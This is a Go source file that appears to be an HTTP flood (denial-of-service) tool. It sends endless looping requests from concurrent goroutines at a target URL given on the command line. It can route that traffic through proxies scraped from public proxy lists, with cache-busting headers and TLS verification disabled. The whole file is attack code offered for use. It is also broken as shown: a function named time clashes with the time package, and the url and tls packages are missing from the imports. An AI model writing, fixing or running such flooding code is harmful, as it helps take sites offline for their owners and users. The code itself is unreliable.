package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	proxies []string
)

func main() {
	if len(os.Args) != 4 {
		os.Exit(0)
	}

	if os.Args[3] == "off" {
		fmt.Println("MODE RAW")
	} else if os.Args[3] == "proxy" {
		proxyscrapeHTTP, err := http.Get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
		if err != nil {
			log.Fatal(err)
		}
		defer proxyscrapeHTTP.Body.Close()
		proxyListHTTP, err := http.Get("https://www.proxy-list.download/api/v1/get?type=http")
		if err != nil {
			log.Fatal(err)
		}
		defer proxyListHTTP.Body.Close()
		rawGithub, err := http.Get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
		if err != nil {
			log.Fatal(err)
		}
		defer rawGithub.Body.Close()

		proxiesData, err := ioutil.ReadAll(proxyscrapeHTTP.Body)
		if err != nil {
			log.Fatal(err)
		}
		proxies = strings.Split(string(proxiesData), "\n")

		proxiesData, err = ioutil.ReadAll(proxyListHTTP.Body)
		if err != nil {
			log.Fatal(err)
		}
		proxies = append(proxies, strings.Split(string(proxiesData), "\n")...)

		proxiesData, err = ioutil.ReadAll(rawGithub.Body)
		if err != nil {
			log.Fatal(err)
		}
		proxies = append(proxies, strings.Split(string(proxiesData), "\n")...)

		fmt.Println("PROXY MODE AUTO")
	} else {
		os.Exit(0)
	}

	go run()

	for i := 0; i < 8; i++ {
		go time()
	}

	select {}
}

func run() {
	if os.Args[3] == "off" {
		config := &http.Client{
			Timeout: time.Second * 10,
		}

		req, err := http.NewRequest("GET", os.Args[2], nil)
		if err != nil {
			log.Fatal(err)
		}

		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("User-Agent", fakeUA())

		resp, err := config.Do(req)
		if err != nil {
			if resp != nil {
				fmt.Println(resp.StatusCode, "CODE BY: OHMDEVPRO")
			} else {
				log.Fatal(err)
			}
		} else {
			fmt.Println(resp.StatusCode, "CODE BY: OHMDEVPRO")
		}
	} else if os.Args[3] == "proxy" {
		rand.Seed(time.Now().UnixNano())
		proxy := proxies[rand.Intn(len(proxies))]
		transport := &http.Transport{
			Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   proxy,
			}),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		config := &http.Client{
			Transport: transport,
			Timeout:   time.Second * 10,
		}

		req, err := http.NewRequest("GET", os.Args[2], nil)
if err != nil {

			log.Fatal(err)		}

		req.Header.Set("Cache-Control", "no-cache")

		req.Header.Set("User-Agent", fakeUA())

		resp, err := config.Do(req)

		if err != nil {

			if resp != nil {

				fmt.Println(resp.StatusCode, "CODE BY: OHMDEVPRO")

			} else {

				log.Fatal(err)

			}

		} else {

			fmt.Println(resp.StatusCode, "CODE BY: OHMDEVPRO")

		}

	}

}

func time() {

	for {

		run()

	}

}

func fakeUA() string {

	// Implement your fake user agent generation logic here

	return ""

}
